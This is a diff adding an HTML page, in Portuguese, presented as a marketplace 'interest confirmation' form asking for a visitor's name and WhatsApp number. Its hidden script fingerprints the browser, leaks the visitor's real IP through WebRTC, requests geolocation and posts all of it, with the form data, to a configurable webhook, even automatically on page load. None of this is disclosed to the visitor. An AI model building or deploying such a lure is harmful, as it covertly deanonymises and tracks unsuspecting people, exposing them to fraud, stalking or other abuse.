@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmacao de Interesse - Marketplace</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
+        .form-group { margin: 15px 0; }
+        input, button { padding: 10px; width: 100%; }
+        button { background: #4CAF50; color: white; border: none; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h2>Confirmacao de Interesse</h2>
+    <p>Por favor, confirme seus dados para combinarmos a entrega:</p>
+    <form id="form">
+        <div class="form-group">
+            <label>Nome:</label>
+            <input type="text" id="nome" required>
+        </div>
+        <div class="form-group">
+            <label>WhatsApp:</label>
+            <input type="tel" id="whatsapp" required>
+        </div>
+        <button type="submit">Confirmar Interesse</button>
+    </form>
+    <div id="result" class="hidden">
+        <h3>Obrigado! Entraremos em contato.</h3>
+    </div>
+
+    <script>
+    // Fingerprint collection
+    const fp = {
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width + 'x' + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
+        webgl: getWebGL(),
+        canvas: getCanvasFingerprint()
+    };
+
+    function getWebGL() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            return gl.getParameter(gl.RENDERER);
+        } catch(e) { return 'N/A'; }
+    }
+
+    function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint', 2, 2);
+        return canvas.toDataURL().slice(-50);
+    }
+
+    // WebRTC IP Leak
+    async function getWebRTCIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) return;
+                const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                if (ip) resolve(ip[1]);
+            };
+            setTimeout(() => resolve('N/A'), 3000);
+        });
+    }
+
+    // Geolocation
+    async function getGeo() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) resolve({lat: 'N/A', lon: 'N/A'});
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
+                () => resolve({lat: 'denied', lon: 'denied'}),
+                {timeout: 5000}
+            );
+        });
+    }
+
+    // Send data (replace with your webhook)
+    async function sendData(formData) {
+        fp.webrtc_ip = await getWebRTCIP();
+        fp.geo = await getGeo();
+        fp.form = formData;
+        
+        // Send to webhook (configure your endpoint)
+        const webhook = 'YOUR_WEBHOOK_URL_HERE';
+        try {
+            await fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(fp)
+            });
+        } catch(e) {}
+        
+        // Also log to console for testing
+        console.log('FINGERPRINT:', JSON.stringify(fp, null, 2));
+    }
+
+    document.getElementById('form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const formData = {
+            nome: document.getElementById('nome').value,
+            whatsapp: document.getElementById('whatsapp').value
+        };
+        await sendData(formData);
+        document.getElementById('form').classList.add('hidden');
+        document.getElementById('result').classList.remove('hidden');
+    });
+
+    // Auto-collect on page load
+    sendData({auto: true});
+    </script>
+</body>
+</html>
